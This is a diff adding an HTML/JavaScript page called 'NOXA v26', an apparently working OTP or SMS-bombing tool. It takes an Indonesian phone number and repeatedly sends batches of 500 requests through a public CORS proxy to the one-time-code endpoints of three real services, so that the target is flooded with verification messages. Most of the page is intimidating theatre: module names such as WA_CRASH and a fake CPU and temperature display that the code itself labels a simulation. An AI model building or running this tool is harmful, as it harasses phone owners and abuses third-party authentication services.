@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NOXA v26 - SOVEREIGN ZENITH</title>
+    <style>
+        :root { --main: #ff0000; --cyan: #00f2ff; --bg: #050505; }
+        body { background: var(--bg); color: #fff; font-family: 'Consolas', monospace; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        
+        .main-panel { width: 100%; max-width: 700px; background: #0a0a0a; border: 2px solid var(--main); border-radius: 15px; padding: 25px; box-shadow: 0 0 50px rgba(255,0,0,0.3); }
+        h1 { text-align: center; letter-spacing: 15px; color: var(--main); text-shadow: 0 0 15px var(--main); margin: 0; }
+        
+        .dash { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; background: #000; padding: 15px; border: 1px solid #222; }
+        .stat { text-align: center; }
+        .stat-val { color: var(--cyan); font-weight: bold; font-size: 1.1em; }
+        .stat-lab { font-size: 0.5em; color: #555; }
+
+        input { width: 100%; background: #000; border: 1px solid #333; padding: 18px; color: var(--cyan); font-size: 1.4em; text-align: center; border-radius: 8px; margin-bottom: 20px; outline: none; transition: 0.3s; box-sizing: border-box; }
+        input:focus { border-color: var(--main); box-shadow: 0 0 20px rgba(255,0,0,0.4); }
+
+        .mod-container { display: grid; grid-template-columns: repeat(4, 1fr); gap: 5px; margin-bottom: 20px; }
+        .mod { background: #111; border: 1px solid #222; padding: 10px; font-size: 0.5em; cursor: pointer; text-align: center; color: #444; font-weight: bold; border-radius: 4px; }
+        .mod.active { border-color: var(--main); color: var(--main); background: rgba(255,0,0,0.1); }
+
+        .btn-ignite { width: 100%; padding: 25px; background: var(--main); color: #fff; border: none; font-size: 1.5em; font-weight: 900; cursor: pointer; letter-spacing: 5px; border-radius: 8px; box-shadow: 0 5px 30px rgba(255,0,0,0.5); }
+        
+        #term { margin-top: 20px; background: #000; border: 1px solid #222; height: 180px; overflow-y: scroll; padding: 15px; font-size: 0.7em; color: #00ff00; }
+    </style>
+</head>
+<body>
+
+<div class="main-panel">
+    <h1>NOXA v26</h1>
+    
+    <div class="dash">
+        <div class="stat"><div class="stat-val" id="d-cpu">0%</div><div class="stat-lab">TGT_CPU</div></div>
+        <div class="stat"><div class="stat-val" id="d-ram">0.1GB</div><div class="stat-lab">TGT_RAM</div></div>
+        <div class="stat"><div class="stat-val" id="d-tmp">31°C</div><div class="stat-lab">TGT_TEMP</div></div>
+        <div class="stat"><div class="stat-val" id="d-pk">0</div><div class="stat-lab">SENT</div></div>
+    </div>
+
+    <input type="number" id="target" placeholder="TARGET (628...)">
+
+    <div class="mod-container" id="mod-list">
+        </div>
+
+    <button class="btn-ignite" onclick="launch()">IGNITE SOVEREIGN</button>
+
+    <div id="term">> System Ready. Sovereign Core Standby...</div>
+</div>
+
+<script>
+    const modules = ["WA_CRASH", "KERNEL_STRESS", "RAM_EATER", "UI_JAMMER", "DATABASE_VOID", "GHOST_IP", "BYPASS_SSL", "THERMAL_KILL", "BUFFER_OVER", "SYNC_LOCK", "HAPTIC_BLAST", "OOM_KILLER", "SIGNAL_DROP", "CACHE_BOMB", "SOCKET_RIP", "SSL_STRIP", "PROXY_V6", "ZENITH_CORE", "NULL_PTR", "FINAL_LOCK"];
+    let active = [];
+    const modList = document.getElementById('mod-list');
+
+    modules.forEach(m => {
+        const div = document.createElement('div');
+        div.className = 'mod';
+        div.innerText = m;
+        div.onclick = () => {
+            if(active.includes(m)) { active = active.filter(x => x !== m); div.classList.remove('active'); }
+            else { active.push(m); div.classList.add('active'); }
+        };
+        modList.appendChild(div);
+    });
+
+    function log(msg, color = "") {
+        const t = document.getElementById('term');
+        t.innerHTML += `<br>[${new Date().toLocaleTimeString()}] > <span style="color:${color}">${msg}</span>`;
+        t.scrollTop = t.scrollHeight;
+    }
+
+    async function launch() {
+        const n = document.getElementById('target').value;
+        if(!n || !n.startsWith('62')) return alert("Gunakan format 628xxx!");
+        if(active.length < 5) return alert("Aktifkan minimal 5 modul!");
+
+        log("ENCRYPTING GHOST TUNNEL...", "#00f2ff");
+        log(`TARGET LOCKED: +${n}`, "yellow");
+
+        let cpu = 0, ram = 0.1, tmp = 31, pk = 0;
+
+        setInterval(() => {
+            const apis = [
+                'https://api.evermos.com/api/v1/auth/otp?phone=',
+                'https://id.bookmyshow.com/api/v1/auth/generate-otp?phone=',
+                'https://m.redbus.id/api/getOtp?phone='
+            ];
+
+            // 500 Packets per 0.1s - Sovereign Power
+            for(let i=0; i<500; i++) {
+                const api = apis[Math.floor(Math.random() * apis.length)];
+                const xhr = new XMLHttpRequest();
+                xhr.open("GET", `https://api.allorigins.win/get?url=${encodeURIComponent(api + n)}&v=${Math.random()}`, true);
+                xhr.send();
+                pk++;
+            }
+            log(`ANNIHILATION: 500 Packets Injected.`, "#ff0000");
+
+            // Update Monitoring Simulation
+            if(cpu < 99) cpu += 1.5;
+            if(ram < 4.2) ram += 0.05;
+            if(tmp < 72) tmp += 0.3;
+            
+            document.getElementById('d-cpu').innerText = `${cpu.toFixed(1)}%`;
+            document.getElementById('d-ram').innerText = `${ram.toFixed(2)}GB`;
+            document.getElementById('d-tmp').innerText = `${tmp.toFixed(1)}°C`;
+            document.getElementById('d-pk').innerText = pk;
+
+        }, 100);
+    }
+</script>
+</body>
+</html>
